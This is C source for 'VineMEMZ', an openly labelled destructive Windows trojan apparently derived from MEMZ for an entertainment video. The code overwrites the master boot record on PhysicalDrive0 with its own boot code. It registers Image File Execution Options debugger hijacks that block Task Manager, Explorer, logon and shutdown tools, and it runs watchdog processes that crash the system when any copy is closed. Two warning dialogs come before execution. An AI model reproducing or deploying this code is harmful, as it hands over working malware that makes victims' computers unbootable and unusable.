/*
    VineMEMZ
    
    Warning: The code was written in about a week and I did not took affort in making it efficient
	         and well organised.

             It was originally written for Vinesauce Joel's Windows 10 Destruction.
             It needs a lot of assets to run.
*/

#include "memz.h"

void main() {
	int argc;
	LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc == 1) {
		if (!lstrcmpW(argv[0], L"/watchdog")) {
			CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);

			WNDCLASSEXA c;
			c.cbSize = sizeof(WNDCLASSEXA);
			c.lpfnWndProc = WindowProcWatchdog;
			c.lpszClassName = "hax";
			c.style = 0;
			c.cbClsExtra = 0;
			c.cbWndExtra = 0;
			c.hInstance = NULL;
			c.hIcon = 0;
			c.hCursor = 0;
			c.hbrBackground = 0;
			c.lpszMenuName = NULL;
			c.hIconSm = 0;

			RegisterClassExA(&c);

			HWND hwnd = CreateWindowExA(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

			MSG msg;
			while (GetMessage(&msg, NULL, 0, 0) > 0) {
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		} else if (!lstrcmpW(argv[0], L"/main")) {
			HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

			if (drive == INVALID_HANDLE_VALUE)
				ExitProcess(2);

			unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);

			// Join the two code parts together
			int i = 0;
			for (; i < code1_len; i++)
				*(bootcode + i) = *(code1 + i);
			for (i = 0; i < code2_len; i++)
				*(bootcode + i + 0x1fe) = *(code2 + i);

			DWORD wb;
			if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
				ExitProcess(3);

			CloseHandle(drive);

			HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

			if (note == INVALID_HANDLE_VALUE)
				ExitProcess(4);

			if (!WriteFile(note, msg, msg_len, &wb, NULL))
				ExitProcess(5);

			CloseHandle(note);

			ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);

			LPWSTR system32 = (LPWSTR)LocalAlloc(0, 4096);
			GetSystemDirectoryW(system32, 2048);

			HKEY key;
			RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", &key);

			LPWSTR value = L"rekt.exe";

			const LPWSTR killNames[] = {
				L"logonui.exe",
				L"taskmgr.exe",
				L"msconfig.exe",
				L"explorer.exe",
				L"shutdown.exe",
				L"taskkill.exe",
				L"mmc.exe"
			};

			for (int i = 0; i < sizeof(killNames) / sizeof(void*); i++) {
				HKEY sKey;
				RegCreateKeyW(key, killNames[i], &sKey);

				RegSetValueExW(sKey, L"Debugger", 0, REG_SZ, (BYTE *)value, lstrlenW(value) * 2);

				RegCloseKey(sKey);
			}

			RegCloseKey(key);

			waveOutSetVolume(NULL, 0xffff);

			for (int p = 0; p < nPayloads; p++) {
				Sleep(payloads[p].startDelay);
				CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
			}

			for (;;) {
				Sleep(10000);
			}
		} else {
			if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "VineMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", "VineMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
				ExitProcess(0);
			}

			wchar_t *fn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 8192 * 2);
			GetModuleFileName(NULL, fn, 8192);

			for (int i = 0; i < 3; i++)
				open(fn, L"/watchdog");

			open(fn, L"/main");

			ExitProcess(0);
		}
	}
}

LRESULT CALLBACK WindowProcWatchdog(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == WM_CLOSE || msg == WM_ENDSESSION) {
		killWindowsInstant();
		return 0;
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}

DWORD WINAPI watchdogThread(LPVOID parameter) {
	int oproc = 0;

	char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);

	Sleep(1000);

	for (;;) {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);

		Process32First(snapshot, &proc);

		int nproc = 0;
		do {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
			char *fn2 = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
			GetProcessImageFileNameA(hProc, fn2, 512);

			if (!lstrcmpA(fn, fn2)) {
				nproc++;
			}

			CloseHandle(hProc);
			LocalFree(fn2);
		} while (Process32Next(snapshot, &proc));

		CloseHandle(snapshot);

		if (nproc < oproc) {
			killWindowsInstant();
		}

		oproc = nproc;

		Sleep(50);
	}
}